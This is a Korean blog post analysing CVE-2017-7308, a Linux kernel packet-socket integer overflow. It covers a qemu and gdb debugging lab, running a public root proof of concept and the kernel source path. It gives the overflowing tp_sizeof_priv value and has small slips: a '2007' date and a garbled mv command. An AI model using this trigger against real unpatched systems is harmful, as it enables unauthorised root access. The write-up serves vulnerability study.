---
title:  linux kernel exploit 분석 - cve-2017-7308
excerpt: "linux kernel exploitation"
search: true
categories: linux-kernel-exploits, CVE-2017-7308
tags: exploit
toc: true
---



## **Intro**

이 글은 google project zero에서 2007년에 발표한 cve-2017-7308에 관해 분석한 글이다. 이 취약점에 대한 자세한 내용은 해당 취약점의 원문인 [Exploiting the Linux kernel via packet sockets](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html ) 에 잘 설명이 되어 있으므로 반드시 읽어보기를 권한다. 만약 영어에 어려움이 있다면 해당 원문의 많은 부분을 번역해 놓은 [CVE-2017-7308 분석 블로그 번역](https://procdiaru.tistory.com/91)을 보면 많은 도움이 될 것이다. 또한 해당 소스코드  flow를 분석한 동일 저자의 [CVE-2017-7308 FLOW 분석](https://procdiaru.tistory.com/93)도 꼭 읽어보기를 권한다.
{: .notice--info}

이 취약점을 분석하는 글을 쓰기까지 여러가지 어려움이 있었는데, 간단히 정리하면 아래와 같다.

1. **kernel 컴파일**<br>
   취약점 자체가 `2017년`에 발표된 예전 취약점이다보니 현 시점에서 맞지 않는 부분이 많았다. 특히 내가 사용하는 `ubuntu 20.04`에서는 kernel 컴파일 자체가 되지 않았다.
   gcc 버전을 낮춰보기도 하고 컴파일 옵션을 바꾸기도 했지만 문제가 해결되지 않아서, 참고 문서들처럼 `ubuntu 18.04`에서 컴파일을 해봤더니 잘 되었다. 원인은 bintuils가 2.31로 업데이트 되면서 발생하는 [문제](https://unix.stackexchange.com/questions/461314/qemu-cannot-boot-locally-built-linux-kernel-anymore){: target="_blank"}로 여겨진다고 한다.
   <br>이 문서를 참고하는 사람은 반드시 `ubuntu 18`을 준비하기 바란다.
2. **kernel 버전 맞추기**<br>
   ubuntu는 linux kernel을 수정한 버전으로 배포판을 만든다. 취약점 분석 원문에서 대상 kernel은 `4.8.0-41-generic` 인데, 정식으로 배포된 linux kernel은 `4.8.0` 밖에 없어서(다음 버전은 4.8.1) 취약한 버전의 kernel 소스를 구할 수가 없었다.
   그래서 virtualbox에 가장 비슷한 버전의 kernel을 가진 `ubuntu-16.04-2`를 설치하고 4.8.0-41로 `업그레이드` 한 후  `apt-get install linux-source-$(uname -r)` 명령으로 소스코드 다운로드를 시도했으나 찾을 수 없다는 메세지만 나왔다.<br>
   다음으로 시도한 것은 github에서 모든 linux kernel 소스를 다운로드 받은 다음 `4.8.0-41 브랜치`로 변경하여 컴파일 하는 것이었으나, 해당 브랜치가 존재하지 않았다.<br>
   마지막으로 시도한 것은 https://launchpad.net/ubuntu/+source/linux-hwe/4.8.0-41.44~16.04.1 페이지에 올려진 [linux-hwe_4.8.0.orig.tar.gz](https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux-hwe/4.8.0-41.44~16.04.1/linux-hwe_4.8.0.orig.tar.gz) 소스를 다운로드한 후 [linux-hwe_4.8.0-41.44~16.04.1.diff.gz](https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux-hwe/4.8.0-41.44~16.04.1/linux-hwe_4.8.0-41.44~16.04.1.diff.gz) 파일로 패치하고 컴파일을 하는 것이었지만 최종 빌드된 kernel의 버전은 `4.8.17`이었다. 결국 kernel 버전을 맞추지 못하고 4.8.0 kernel로 소스 디버깅을 시도했고, 다행히 취약한 부분의 소스에서는 변경이 없었는지 무사히 진행할 수 있었다.
3. **파일 시스템 만들기**<br>
   qemu를 처음 써봐서 파일 시스템을 무엇을 써야 하는지, 확장자에 적절한 옵션은 무엇인지 모르는 상태에서 예전 문서를 따라해 봤으나 잘 되지 않았다. 웹 서핑을 통해 `buildroot`, `busybox`, `syzkaller` 등을 사용해 봤는데, buildroot는 linux kernel 버전이 너무 낮으면 에러가 발생했고, kernel 버전에 맞게 버전을 낮춘  buildroot는 컴파일이 잘 되지 않는 문제가 있었다. busybox는 최신 버전의 qemu에 맞는 설정을 찾지 못해 부팅에 실패했다.
   결국 `syzkaller`의 `create-image.sh`를 이용해 만든 파일 시스템은 poc 동작까지 제대로 동작하는 것을 확인했으나, 시스템 에러 로그가 계속 발생하는 문제가 있었다. 해당 문제는 결국 해결하지 못했지만 어차피 콘솔창을 쳐다볼 것도 아니어서 감수하기로 하고 넘어갔다.



아마 위의 방법도 일정한 시간이 지난 후에는 제대로 동작하지 않을 가능성이 많은데, 혹시라도 그런 경우에 부딪힌다면 많은 시간을 투입하는 수 밖에는 없을 것 같다.



## 테스트 환경 구축하기

일반적으로 `linux kernel exploit`에 도전하는 뉴비들에게 있어서 가장 어려운 것이 바로 디버깅 환경 구축일 것이다. 

개인적으로도 이 부분이 가장 어려웠고 가장 많은 시간을 투자했는데, 일단 예전 버전의 kernel에 존재하는 버그를 exploit 하려다보니, how-to 형식으로 되어 있는 예전 문서를 따라해도 모두 재현이 안되었다. 심지어 현재 사용 중인 리눅스에서는 취약한 버전의 kernel 컴파일 조차도 안되는 경우가 있는데다가, `qemu`의 옵션마저 달라져서 많은 시간을 낭비했던 것 같다.

하여튼 개인적으로도 테스트 환경 구축하는게 제일 어려웠기 때문에 다시 한번 정리해 두려고 한다. 현 시점(2021/05)에서 테스트 환경을 구축하는데 사용된 머신은 `ubuntu 20.04`의 최신 업데이트가 적용된 리눅스이다.

테스트 환경을 구축하기 위해서 필요한 것은 간단하게 아래와 같다.

- qemu (가상화 소프트 웨어)
- 취약한 버전의 kernel 바이너리 (부팅용)
- 취약한 버전의 kernel 디버깅 심볼 (디버깅용)
- 취약한 버전의 kernel 소스 (소스 디버깅용)
- 루트 파일 시스템 (exploit 실행)
{: .notice}



### 1. VirtualBox에 ubuntu 설치하기

해당 kernel exploit은 ubuntu 베이스의 kernel 버전 4.8.0-41에서 테스트 되었으므로, exploit의 안정적인 동작을 위해 동일한 버전의 kernel이 필요하다. 이를 위해 먼저 ubuntu 16.04-2를 VirtualBox에 설치한다.

업그레이드 전 ubuntu 16.04.2의 kernel 버전은 아래와 같다.
<a href="/assets/images/cve-2017-7308/uname.png"><img src="/assets/images/cve-2017-7308/uname.png" alt="uname"></a>

<br>
그리고 아래의 명령어로 kernel을 취약한 버전으로 업그레이드 한다.
```bash
sudo apt-get install linux-image-4.8.0-41-generic
```

<br>
업그레이드가 완료되고 재부팅을 한 후 kernel 버전은 아래와 같다.
<a href="/assets/images/cve-2017-7308/uname-after-upgrade.png"><img src="/assets/images/cve-2017-7308/uname-after-upgrade.png" alt="uname-after-upgrade"></a>


<br>
이제 /boot 디렉토리로 이동하면 아래와 같이 kernel-4.8.0-41의 바이너리 파일이 존재할 것이다.
<a href="/assets/images/cve-2017-7308/binary_kernel.png"><img src="/assets/images/cve-2017-7308/binary_kernel.png" alt="binary_kernel"></a>

<br>
위의 바이너리들 중 vmlinuz-4.8.0-41-generic 파일을 host의 kernel 디렉토리로 복사한다. 아래와 같이 파일의 소유권을 변경하고 scp로 복사해 오자.

```bash
[guest]
sudo chown lucid7:lucid7 vmlinuz-4.8.0-41-generic

[host]
scp lucid7@192.168.56.8:/boot/vmlinuz-4.8.0-41-generic .
```
<a href="/assets/images/cve-2017-7308/get_binary_kernel.png"><img src="/assets/images/cve-2017-7308/get_binary_kernel.png" alt="get_binary_kernel"></a>


<br>
이제 kernel 디버깅 심볼을 설치하고 가지고 올 차례이다. 아래의 명령어를 차례로 입력하여 kernel debug symbol을 설치한다.

```bash
[guest]
echo "deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse
deb http://ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse
deb http://ddebs.ubuntu.com $(lsb_release -cs)-proposed main restricted universe multiverse" | \
sudo tee -a /etc/apt/sources.list.d/ddebs.list

sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 428D7C01 C8CAB6595FDFF622
sudo apt-get update
sudo apt-get install -y linux-image-`uname -r`-dbgsym
```

<br>
설치가 완료되면 debug symbol을 호스트로 가져온다. 해당 파일의 위치는 /usr/lib/debug/boot/ 이다.

```bash
[host]
cd ~/lke
mkdir symbol
cd symbol
scp lucid7@192.168.56.8:/usr/lib/debug/boot/vmlinux-4.8.0-41-generic .
```


### 2. 파일 시스템 만들기

부팅을 위한 kernel은 준비가 완료되었다. 사실 이 상태로도 부팅까지는 가능하지만 exploit을 실행시키기 위해 파일 시스템이 반드시 필요하다.
아래와 같이 syzkaller에서 제공하는 debian 이미지 설치용 스크립트를 사용하면 쉽게 구축이 가능하다.

```bash
[host]
sudo apt install debootstrap
cd ~/lke
mkdir fs
cd fs/
wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh
chmod +x create-image.sh
./create-image.sh --feature full
rm ./create-image.sh
```

<br>
빌드가 완료되면 호스트에서 파일 시스템으로 파일을 복사하는 방법을 알려주는 아래와 같은 화면이 나온다.
<a href="/assets/images/cve-2017-7308/build_filesystem.png"><img src="/assets/images/cve-2017-7308/build_filesystem.png" alt="build_filesystem"></a>


<br>
Local privilege escalation 취약점이므로 먼저 일반 사용자를 추가하자.

```bash
[host]
sudo mkdir /mnt/chroot
sudo mount -o loop fs/stretch.img /mnt/chroot
sudo chroot /mnt/chroot adduser user
```

<br>그리고 exploit을 컴파일 한 후 바이너리만 복사한다.

```bash
[host]
cd ~/lke
git clone https://github.com/xairy/kernel-exploits.git
mv kernel-exploits exploit
cd exploit
cp CVE-2017-7308/poc.c .
rm -rf ./CVE* ./.* ./prefetch-side-channel ./README.md
gcc poc.c -o poc
sudo cp -a ./poc /mnt/chroot/home/user/
sudo umount /mnt/chroot
```


### 3. qemu로 부팅하기

먼저 qemu를 설치한다.

```bash
[host]
sudo apt install qemu
```


<br>
현재 시점에서 테스트 환경을 셋팅하는 디렉토리는 아래와 같다.
<a href="/assets/images/cve-2017-7308/lke.png"><img src="/assets/images/cve-2017-7308/lke.png" alt="lke"></a>

<br>
해당 디렉토리에 아래와 같이 start.sh 파일을 만들고 실행 권한을 부여한다.

```c++
#!/bin/bash

BASEDIR=/home/lucid7/lke
qemu-system-x86_64 \
	-m 2G \
	-smp 2 \
	-kernel $BASEDIR/kernel/vmlinuz-4.8.0-41-generic \
	-append "console=ttyS0 root=/dev/sda debug nokaslr kpti=1 earlyprintk=serial net.ifnames=0" \
	-drive file=$BASEDIR/fs/stretch.img,format=raw \
	-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \
	-net nic,model=e1000 \
	-enable-kvm \
	-cpu host,+smep,+smap \
	-nographic \
	-s \
	-pidfile vm.pid \
	2>&1 | tee vm.log

```

<br>
위의 스크립트를 생성 후 실행하자. kernel 버전을 확인해보면 4.8.0-41-generic인 것을 확인할 수 있다.
> virtualbox와 qemu는 동시에 실행되지 않으므로 둘 중 하나는 반드시 종료시켜야 한다.

<a href="/assets/images/cve-2017-7308/syzkaller_root.png"><img src="/assets/images/cve-2017-7308/syzkaller_root.png" alt="syzkaller_root"></a>

<br>
이제 user 계정으로 switch 하고 poc를 실행하면 아래와 같이 root 권한을 획득하는 모습을 볼 수 있다.
<a href="/assets/images/cve-2017-7308/get_root.png"><img src="/assets/images/cve-2017-7308/get_root.png" alt="get_root"></a>


> systemd-journald 관련 에러는 터미널 상에서 계속 발생하는 메세지인데 무시하면 된다.
> 지저분하기는 한데 이걸 해결하는 방법은 찾지 못했다.


### 4. GDB로 원격 디버깅 하기

리눅스 kernel 디버깅 시에는 많은 사람들이 pwndbg를 추천하므로 설치하도록 한다.

```bash
[host]
cd ~/lke
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
cd ..
rm -rf pwndbg
```

<br>
gdb로 kernel 디버깅을 위해 필요한 옵션들을 아래와 같이 debug.gdb 파일에 저장하고 -x 옵션을 사용해서 접속한다.

```bash
# debug.gdb
set print pretty on
add-auto-load-safe-path source/scripts/gdb/vmlinux-gdb.py
add-symbol-file symbol/vmlinux-4.8.0-41-generic 0
target remote localhost:1234
source /home/lucid7/Downloads/pwndbg/gdbinit.py
```

```bash
cd ~/lke
gdb -x debug.gdb
```

<br>
qemu로 대상 서버를 실행한 후 위의 파일을 이용해서 gdb로 접속하면 아래와 같은 화면을 볼 수 있다.
<a href="/assets/images/cve-2017-7308/gdb_connect.png"><img src="/assets/images/cve-2017-7308/gdb_connect.png" alt="gdb_connect"></a>

<br>
일단 대상 서버에 원격으로 연결은 성공했다. 하지만 위의 화면을 자세히 보면 소스 파일을 찾을 수 없다는 에러가 있는 것을 볼 수 있다.
해당 에러는 아래와 같다.
<a href="/assets/images/cve-2017-7308/gdb_error.png"><img src="/assets/images/cve-2017-7308/gdb_error.png" alt="gdb_error"></a>

우리는 virtualbox에서 kernel 이미지를 가져온 후 qemu를 사용해 부팅시킨 상태이다. 우리가 가져온 해당 kernel 이미지는 위의 경로에 나와 있는 소스코드를 참조하도록 설정된 이미지이기 때문에, 해당 경로에 파일이 없어서 에러가 발생한 것이다.
따라서 가장 간단하게 해결하기 위해 해당 경로에  kernel 소스를 준비하자.


### 5. kernel 소스 준비하기

```bash
[host]
sudo mkdir -p /build/linux-hwe-bZV_oZ/
cd /build/linux-hwe-bZV_oZ/
sudo wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.8.tar.xz
sudo tar -Jxf linux-4.8.tar.xz
mv sudo mv linux-4.8 linux-hwe-4.8.0
```

<br>
이제 다시 gdb를 실행해 보면 해당 에러가 사라졌음을 확인할 수 있다.
<a href="/assets/images/cve-2017-7308/gdb_complete.png"><img src="/assets/images/cve-2017-7308/gdb_complete.png" alt="gdb_complete"></a>


<br>
소스 버전이 일치하지 않아 실제 디버깅 시에는 소스와 완전히 일치하지 않지만 그래도 없는 것 보다는 낫다. 비록 완벽하지는 않지만 여기까지 오면 대상 서버의 kernel을 소스코드와 비교하면서 디버깅할 수 있는 준비가 끝났다고 볼 수 있다.

디버깅 준비가 끝났으니 이제 본격적으로 취약점을 분석해보기로 하자.



## CVE-2017-7308

> 이 취약점에 대한 조금 더 구체적인 내용은 Intro에서 소개한 [Exploiting the Linux kernel via packet sockets](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)를 읽어볼 것을 권장한다.

이 취약점은 2017년 google project zero의 일원인 Andrey Konovalov가 syzkaller fuzzer를 이용해 발견한 local privilege escalation 취약점이다. 특정 kernel 버전을 가진 linux에서 packet socket이 패킷을 수신할 때 발생하는데, packet_set_ring() 함수에서 block의 크기를 제대로 검증하지 않는 것이 원인이다. 이로 인해 integer overflow가 발생하여 out of bound write를 할 수 있다.
CVE-2017-7308은 linux kernel version 4.8.0 이상 4.10.6 이하 버전에서 발생하며, KASLR/SMEP/SMAP을 우회하여 root 권한을 획득할 수 있다.


### 1. Overview

packet socket은 우리가 네트워크 프로그램을 작성할 때 사용하는 일반적인 socket이 아니라, wireshark 같이 packet을 수집하는 프로그램에서 사용하는 특수한 socket이다. packet socket은 socket() 함수에 AF_PACKET 파라미터를 설정하여 생성할 수 있으며, 이 socket으로는 device driver 레벨에서의 packet 송수신을 할 수 있다. device driver 레벨에서 동작하므로 packet socket을 사용하기 위해서는 사용자의 namespace에 CAP_NET_RAW 권한이 있어야만 한다.

packet socket을 생성하면 아래와 같이 packet_sock 구조체가 할당된다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/internal.h#L103 */
struct packet_sock {
    ...
	struct sock					sk;
    struct packet_ring_buffer	rx_ring;
	struct packet_ring_buffer	tx_ring;
	...
	enum tpacket_versions   	tp_version;
	...
	int                     	(*xmit)(struct sk_buff *skb);
	...
}; 
```



> kernel 버전 별 구조체의 모습과 오프셋을 알기 위해 kernel symbol로부터 아래 명령을 사용하여 확인할 수 있다.
>
> ```bash
> pahole -C packet_sock symbol/vmlinux-4.8.0-41-generic
> ```
>
> ![pahole](/assets/images/cve-2017-7308/pahole.png)



packet socket은 패킷 송수신 시 더 빠른 처리를 위해 user 영역과 kernel 영역 사이에서 공유되는 `packet_ring_buffer 구조체` 형의 `ring buffer`를 사용한다. 위의 packet_sock 구조체에서 볼 수 있듯이 두 개의 ring buffer가 존재하는데, `tx_ring`은 `패킷 송신`에 사용되고 `rx_ring`은 `패킷 수신`에 사용된다. 그리고 이 취약점은 패킷 수신 시 사용되는 `rx_ring`에서 발생한다.

ring buffer는 여러 버전이 존재하며, 해당 취약점은 `TPACKET_V3` 버전의 ring buffer에서 발생한다.
<br>아래는 해당 버전에서 사용하는 구조체의 모습이다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/include/uapi/linux/if_packet.h#L274 */
struct tpacket_req3 {
	unsigned int	tp_block_size;			/* Minimal size of contiguous block */
	unsigned int	tp_block_nr;			/* Number of blocks */
	unsigned int	tp_frame_size;			/* Size of frame */
	unsigned int	tp_frame_nr;			/* Total number of frames */
	unsigned int	tp_retire_blk_tov; 		/* timeout in msecs */
	unsigned int	tp_sizeof_priv; 		/* offset to private data area */
	unsigned int	tp_feature_req_word;
};
```

<br>
위 구조체 모습에서 볼 수 있듯이, ring buffer는  `block`과 `frame`으로 구성된다. frame은 block 내에 여러 개가 존재하며 고정된 크기를 가지지 않는다. 패킷을 수신하게 되면 kernel은 수신된 패킷을 frame에 저장한다. frame의 크기가 고정되어 있지 않기 때문에, 사용자는 block의 크기와 갯수, frame의 크기와 갯수 등을 적절한 값으로 설정하여 setsockopt() 함수를 통해 패킷 소켓에 적용해야 한다.

예를 들어 block size 4096, frame size 2048, block 개수 4, frame 개수 8로 설정했다면 해당 블록은 아래와 같은 모양을 가지게 된다.

```c
/* https://www.programmersought.com/article/86347330251/ */
       block #1                 block #2
---------------------    ---------------------
| frame 1 | frame 2 |    | frame 3 | frame 4 |
---------------------    ---------------------
       block #3                 block #4
---------------------    ---------------------
| frame 5 | frame 6 |    | frame 7 | frame 8 |
---------------------    ---------------------
```


<br>
아래는 TPACKET_V3 ring buffer 구조체를 나타낸 그림이다.
<a href="/assets/images/cve-2017-7308/rb.png"><img src="/assets/images/cve-2017-7308/rb.png" alt="rb"></a>

> https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html

<br>
위의 그림에서와 같이 각 block은 `tpacket_block_desc` 구조체 형의 header와 `private area`로 구성되어 있으며,  frame 역시 `tpacket3_hdr` 구조체 형의 header와  `frame data`로 구성되어 있다. tpacket_block_desc 구조체의 `offset_to_first_pkt` 변수가 첫번째 frame의 header를 가리키고 tpacket3_hdr 구조체의 `tp_next_offset` 변수가 다음 frame header를 가리키는 방식으로 block이 구성된다.

패킷은 frame에 저장되기 때문에 kernel은 block 내 첫 번째 frame부터 마지막 frame에 도달할 때까지 이동하면서 해당 frame이 수신된 패킷을 저장할 공간이 충분한지 확인하고, 만약 공간이 충분할 경우 해당 frame에 패킷을 저장한다. 따라서 kernel은 위 그림에서와 같이 private area 영역의 크기를 참고해서 첫 번째 frame header까지의 거리를 계산하는데, 이 계산 과정에서 integer overflow가 발생한다.


실제 취약점이 발생하는 코드는 아래와 같다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c#L4207 */
if (po->tp_version >= TPACKET_V3 &&
	(int)(req->tp_block_size - BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)) <= 0)
		goto out;
```

<br>
위의 코드에서 `req_u->req3.tp_sizeof_priv` 는 private area의 크기를 나타내는 변수이며, 사용자가 입력하는 값이다. 따라서 사용자가 해당 값을 아래와 같이 입력할 경우 integer overflow가 발생하고 위의 조건문을 통과할 수 있게 된다.

```c
A = req->tp_block_size = 4096 = 0x1000
B = req_u->req3.tp_sizeof_priv = (1 << 31) + 4096 = 0x80001000
BLK_PLUS_PRIV(B) = (1 << 31) + 4096 + 48 = 0x80001030
A - BLK_PLUS_PRIV(B) = 0x1000 - 0x80001030 = 0x7fffffd0
(int)0x7fffffd0 = 0x7fffffd0 > 0 
```

따라서 private area의 크기 값을 적절히 설정함으로써 private area를 넘어 임의의 메모리를 덮어쓸 수 있게 되는 것이다.


지금까지 나온 자료구조들을 하나로 정리해보자.

1. 패킷 소켓 생성 시 `packet_socket` 구조체가 생성된다.
2. 패킷을 수신하게 되면 packet_socket 구조체 내 `packet_ring_buffer` 구조체를 사용한다.
3. `packet_ring_buffer` 구조체는 버퍼를 list로 관리하며 각 page vector별로 `block`이 연결되어 있다.
4. block은 `tpacket_block_desc`형 header와 `private area,` `frame`들로 구성되어 있다.
5. frame는 `tpacket3_hdr`형 header와 패킷이 저장되는 data 영역으로 구성되어 있다.
6. 패킷이 수신되면 kernel은 block 내 frame들 중 공간이 충분한 frame이 있는지 확인 후 저장하는데, 이 때 `private area 영역의 크기`를 참고한다.
7. private area 영역은 사용자로부터 입력 가능한 값이고, 계산 결과가 int형의 범위를 넘어서도록 설정할 경우 integer overflow가 발생한다.
8. 따라서 private area 영역의 크기가 int형의 범위를 넘어서도록 설정된 block에 패킷이 저장될 때, private area 영역 너머의 메모리를 덮어쓸 수 있다.
<a href="/assets/images/cve-2017-7308/structure_link.png"><img src="/assets/images/cve-2017-7308/structure_link.png" alt="structure_link"></a>




### 2. 소스 분석

실제 linux kernel source를 분석하면서 해당 기능을 이해해보자. ring buffer가 설정되는 과정과 수신된 packet을 처리하는 두 부분을 보면 전체적인 exploit 과정이 이해될 것이다.



#### A. ring buffer 설정

TPACKET_V3 버전의 ring buffer를 사용하기 위해서는 tpacket_req3 구조체를 채워야 한다. 아래는 간단한 예제 코드이다.

```c
struct tpacket_req3 req;
memset(&req, 0, sizeof(req));

req.tp_block_size = block_size;							// 블록 사이즈
req.tp_block_nr = block_nr;								// 블록 갯수
req.tp_frame_size = frame_size;							// 프레임 사이즈
req.tp_frame_nr = (block_size * block_nr) / frame_size;	// 프레임 갯수
req.tp_retire_blk_tov = timeout;						// 블록 폐기 시간
req.tp_sizeof_priv = sizeof_priv;						// private area 크기
req.tp_feature_req_word = 0;

rv = setsockopt(socket, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
```

<br>
kernel 소스에서 ring buffer를 설정하는 곳은 af_packet.c의 packet_set_ring() 함수이다. 이 함수에서 하는 기능 중 중요한 부분만 살펴보자.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c#L4154 */
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u, int closing, int tx_ring) {
    ...
}
```

<br>
아래와 같이 4156라인에서  `tpacket_req` 구조체 형의 변수에 설정되는 값인 `&req_u->req`는 사용자가 입력한 값이다.

```c
struct tpacket_req *req = &req_u->req;
```

<br>
4184라인에서는 사용자에 의해 설정된 block의 갯수가 0이 아닌지를 확인한다.

```c
if (req->tp_block_nr) {
    ...
```

<br>
이후 4225라인에 도달하면 사용자가 입력한 block의 크기에 맞는 order를 구해온 후 order를 기반으로 하여 page vector를 구해온다. order가 무엇인지에 대한 설명은 이후에 살펴보도록 하자.

```c
order = get_order(req->tp_block_size);
pg_vec = alloc_pg_vec(req, order);
```

<br>
TPACKET_V3이고 rx_ring이므로 4235라인에서 init_prb_bdqc() 함수를 최종으로 호출하여 tpacket_kbdq_core 구조체의 값을 설정한다.

```c
switch (po->tp_version) {
		case TPACKET_V3:
		/* Transmit path is not supported. We checked
		 * it above but just being paranoid
		 */
			if (!tx_ring)
				init_prb_bdqc(po, rb, pg_vec, req_u);
			break;
```

<br>
아래는 Overview에서 잠시 살펴본 `tpacket_kbdq_core` 구조체의 내용이다. 이 구조체는 packet_ring_buffer 구조체 내에 있으며, ring buffer내 block에 대한 정보를 가지고 있다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/internal.h#L14 */
struct tpacket_kbdq_core {
	struct pgv	*pkbdq;
	unsigned int	feature_req_word;
	unsigned int	hdrlen;
	unsigned char	reset_pending_on_curr_blk;
	unsigned char   delete_blk_timer;
	unsigned short	kactive_blk_num;
	unsigned short	blk_sizeof_priv;

	/* last_kactive_blk_num:
	 * trick to see if user-space has caught up
	 * in order to avoid refreshing timer when every single pkt arrives.
	 */
	unsigned short	last_kactive_blk_num;

	char		*pkblk_start;
	char		*pkblk_end;
	int		kblk_size;
	unsigned int	max_frame_len;
	unsigned int	knum_blocks;
	uint64_t	knxt_seq_num;
	char		*prev;
	char		*nxt_offset;
	struct sk_buff	*skb;

	atomic_t	blk_fill_in_prog;

	/* Default is set to 8ms */
#define DEFAULT_PRB_RETIRE_TOV	(8)

	unsigned short  retire_blk_tov;
	unsigned short  version;
	unsigned long	tov_in_jiffies;

	/* timer to retire an outstanding block */
	struct timer_list retire_blk_timer;
};


```


<br>
다시 소스로 돌아가서 init_prb_bdqc() 함수는 어떤 기능을 하는지 간단히 살펴보자.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c#L604 */
static void init_prb_bdqc(struct packet_sock *po,
			struct packet_ring_buffer *rb,
			struct pgv *pg_vec,
			union tpacket_req_u *req_u)
{
	struct tpacket_kbdq_core *p1 = GET_PBDQC_FROM_RB(rb);
	struct tpacket_block_desc *pbd;

	memset(p1, 0x0, sizeof(*p1));

	p1->knxt_seq_num = 1;
	p1->pkbdq = pg_vec;
	pbd = (struct tpacket_block_desc *)pg_vec[0].buffer;
	p1->pkblk_start	= pg_vec[0].buffer;
	p1->kblk_size = req_u->req3.tp_block_size;
	p1->knum_blocks	= req_u->req3.tp_block_nr;
	p1->hdrlen = po->tp_hdrlen;
	p1->version = po->tp_version;
	p1->last_kactive_blk_num = 0;
	po->stats.stats3.tp_freeze_q_cnt = 0;
	if (req_u->req3.tp_retire_blk_tov)
		p1->retire_blk_tov = req_u->req3.tp_retire_blk_tov;
	else
		p1->retire_blk_tov = prb_calc_retire_blk_tmo(po,
						req_u->req3.tp_block_size);
	p1->tov_in_jiffies = msecs_to_jiffies(p1->retire_blk_tov);
	p1->blk_sizeof_priv = req_u->req3.tp_sizeof_priv;

	p1->max_frame_len = p1->kblk_size - BLK_PLUS_PRIV(p1->blk_sizeof_priv);
	prb_init_ft_ops(p1, req_u);
	prb_setup_retire_blk_timer(po);
	prb_open_block(p1, pbd);
}
```


<br>
먼저 파라미터로 전달된 packet_ring_buffer형 포인터 rb로부터 tpacket_kbdq_core 위치를 찾아 p1변수에 넣는다. 이제 p1 변수를 통해 tpacket_kbdq_core 구조체 값을 채우기 시작한다.

- `p1->pkbdq`를 page vector를 가리키게 한다.
- `p1->pkblk_start`가 첫번째 page vector의 buffer 시작점을 가리키도록 설정한다.
- `p1->retire_blk_tov`에는 block이 폐기될 시간을 설정한다. 일반적으로 사용자들은 도착한 패킷을 빨리 확인하고 싶어하기 때문에, ring buffer가 꽉 차지 않아도 일정한 시간이 지나면 block을 폐기하도록 되어 있는데, 이 때 참고하는 값이다.
- `p1->blk_sizeof_priv`에는 사용자가 입력한 private area의 크기 값이 들어간다.
- `p1->max_frame_len`에는 전체 block의 크기에서 (block header + private area) 한 값을 뺌으로써 실제 frame의 크기가 들어간다.


<br>
`prb_setup_retire_blk_timer()` 함수에서는 내부에서 호출되는  prb_init_blk_timer() 함수를 통해 타이머가 완료되었을 때 실행하는 함수와 그 함수에 전달되는 parameter를 설정하며, retire_blk_timer 구조체에 설정된 값을 기반으로 한다.

```c
static void prb_setup_retire_blk_timer(struct packet_sock *po)
{
	struct tpacket_kbdq_core *pkc;

	pkc = GET_PBDQC_FROM_RB(&po->rx_ring);
	prb_init_blk_timer(po, pkc, prb_retire_rx_blk_timer_expired);
}
```

```c
static void prb_init_blk_timer(struct packet_sock *po,
		struct tpacket_kbdq_core *pkc,
		void (*func) (unsigned long))
{
	init_timer(&pkc->retire_blk_timer);
	pkc->retire_blk_timer.data = (long)po;
	pkc->retire_blk_timer.function = func;
	pkc->retire_blk_timer.expires = jiffies;
}
```

<br>
그리고 마지막으로 `prb_open_block()` 함수를 호출한다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c#L841 */
static void prb_open_block(struct tpacket_kbdq_core *pkc1,
	struct tpacket_block_desc *pbd1)
{
	struct timespec ts;
	struct tpacket_hdr_v1 *h1 = &pbd1->hdr.bh1;

	smp_rmb();

	/* We could have just memset this but we will lose the
	 * flexibility of making the priv area sticky
	 */

	BLOCK_SNUM(pbd1) = pkc1->knxt_seq_num++;
	BLOCK_NUM_PKTS(pbd1) = 0;
	BLOCK_LEN(pbd1) = BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);

	getnstimeofday(&ts);

	h1->ts_first_pkt.ts_sec = ts.tv_sec;
	h1->ts_first_pkt.ts_nsec = ts.tv_nsec;

	pkc1->pkblk_start = (char *)pbd1;
	pkc1->nxt_offset = pkc1->pkblk_start + BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);

	BLOCK_O2FP(pbd1) = (__u32)BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);
	BLOCK_O2PRIV(pbd1) = BLK_HDR_LEN;

	pbd1->version = pkc1->version;
	pkc1->prev = pkc1->nxt_offset;
	pkc1->pkblk_end = pkc1->pkblk_start + pkc1->kblk_size;

	prb_thaw_queue(pkc1);
	_prb_refresh_rx_retire_blk_timer(pkc1);

	smp_wmb();
}
```

<br>
이 함수에서 중요한 부분은 바로 `pkc1->pkblk_start`와 `pkc1->nxt_offset` 값을 설정하는 부분이다.

`pkc1->pkblk_start`는 block의 시작점을 나타내는데, 이 값은 이전 init_prb_bdqc() 함수에서 설정이 되었으나 여기에서 한번 더 재설정된다. `pkc->nxt_offset` 값은 패킷이 저장될 위치를 나타내는 값이며, block의 시작점에서 private area의 크기를 더한 값으로 설정된다.

`BLK_PLUS_PRIV`는 매크로로써 아래와 같이 정의되어 있으며, block의 header의 크기와 private area의 크기를 더한 값을 반환한다.

```c
/* https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c#L177 */

#define V3_ALIGNMENT	(8)
